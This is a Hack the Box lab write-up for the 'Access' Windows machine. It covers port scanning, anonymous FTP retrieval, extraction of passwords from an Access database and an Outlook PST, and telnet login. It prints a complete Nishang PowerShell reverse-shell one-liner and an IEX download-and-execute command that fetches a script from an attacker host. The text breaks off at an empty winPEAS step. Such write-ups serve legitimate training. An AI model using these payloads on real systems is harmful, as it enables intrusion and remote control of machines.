# Hack the Box - Access

```CSS
Machine IP: 10.10.10.98 - Windows
```

- [NMAP: All TCP ports](#nmap-open-ports)
- [NMAP: Open ports Service Version](#nmap-service-version)
- [FTP Anonymous Login](#ftp-login)
  - [Download Files](#ftp-downloads)
- [Telnet Anonymous Login](#telnet-anonymous-login)
- [Website](#webserver)

## NMAP Open Ports
```CSS
▶ nmap -Pn -sS -p- 10.10.10.98 -T4 --min-rate 5000 -oN nmap.surface

Nmap scan report for 10.10.10.98
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
```

## NMAP Service Version
```CSS
▶ nmap -sC -sV -p 21,23,80 10.10.10.98 -T4 --min-rate 5000 -oN nmap.deep

Nmap scan report for 10.10.10.98
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.59 seconds
```

---

## Telnet Anonymous Login
  - Telent log in failed.
```CSS
▶ telnet 10.10.10.98
```
![image](https://user-images.githubusercontent.com/83878909/231275176-f81e52d6-3975-497a-b375-17f4cc9eb3e2.png)

---

## Website
![image](https://user-images.githubusercontent.com/83878909/231276321-d9810c39-9ac9-4c59-b50d-0f7a296ede38.png)

---

## FTP Login
  - Log in to ftp, anonymous login allowed. 
```CSS
▶ ftp 10.10.10.98
```
![image](https://user-images.githubusercontent.com/83878909/231272883-d87603cc-e9b5-461c-a670-5c36226f6a57.png)

### FTP Downloads
  - Download all directories and files found in FTP.
```CSS
▶ wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```
![image](https://user-images.githubusercontent.com/83878909/231274006-305f40e6-8efc-4af0-8f4c-6e85319bab51.png)

### ZIP File
  - Access File
```CSS
▶ 7z x Access\ Control.zip
```
![image](https://user-images.githubusercontent.com/83878909/233909981-8b6ad107-b1cf-4ad8-87f8-fc00f663bc5b.png)

  - Technical Information
```CSS
▶ 7z l -slt Access\ Control.zip
```
![image](https://user-images.githubusercontent.com/83878909/233909126-48769505-adde-4982-beaf-2fe1635970f4.png)


### MBD File
  - Look into the file
```CSS
▶ strings backup.mdb
```
![image](https://user-images.githubusercontent.com/83878909/233927444-536ae3fa-9377-4efd-b6ac-783b4b7df837.png)

  - Extract Information
```CSS
▶ mdb-tables backup.mdb | grep --color=auto user
```
![image](https://user-images.githubusercontent.com/83878909/233927978-8404a46f-e088-4f4c-8d8c-5e6638269cbc.png)
```CSS
▶ mdb-export backup.mdb auth_user
```
![image](https://user-images.githubusercontent.com/83878909/233928307-60dc1282-0923-472e-a148-cdb5bedba4ea.png)

### Extract ZIP File Contents
```CSS
▶ 7z x Access\ Control.zip
```
```CSS
password: access4u@security
```
![image](https://user-images.githubusercontent.com/83878909/233932586-4b1e138c-13d7-4197-81ac-46189c7cd293.png)

---

### PST File
  - Check the file.
```CSS
▶ file Access\ Control.pst
```
File Type: Microsoft Outlook Personal Storage

  - Convert `.pst` file to `.mbox` file.
```CSS
▶ readpst Access\ Control.pst
```
![image](https://user-images.githubusercontent.com/83878909/233936965-6d6ef291-91dd-4cd2-b153-8d1101af60b6.png)

  - Read emails
```CSS
▶ less Access\ Control.mbox
```
![image](https://user-images.githubusercontent.com/83878909/233937943-92fb0eed-9159-4d42-9f28-8807dc589fa5.png)
```CSS
Username: security
Password: 4Cc3ssC0ntr0ller
```

---

## Telnet Login
  - Login using found credentials.
```CSS 
▶ telnet 10.10.10.98
```
![image](https://user-images.githubusercontent.com/83878909/233939322-189c0e45-6083-4a2f-bed0-05bd8100d025.png)

---

### Shell Upgrade
#### Nishang
  - Modify and upload `nishang` TCP shell.
  - `/opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1`.

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/aabac44e-4472-4b19-8361-484e3da4546a)

The script should look like:
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ecc6375d-aa15-4a90-85ee-29593524ee66)
```CSS
$client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Upload & Execute
```CSS
▶ python -m http.server
```
```CSS
▶ nc -nlvvp 4444
```
```CSS
C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24:8000/Invoke-PowerShellTcpOneLine.ps1')"
```


#### winPEAS
  - Upload `winPEASx64.exe`.
```CSS
▶ 
```
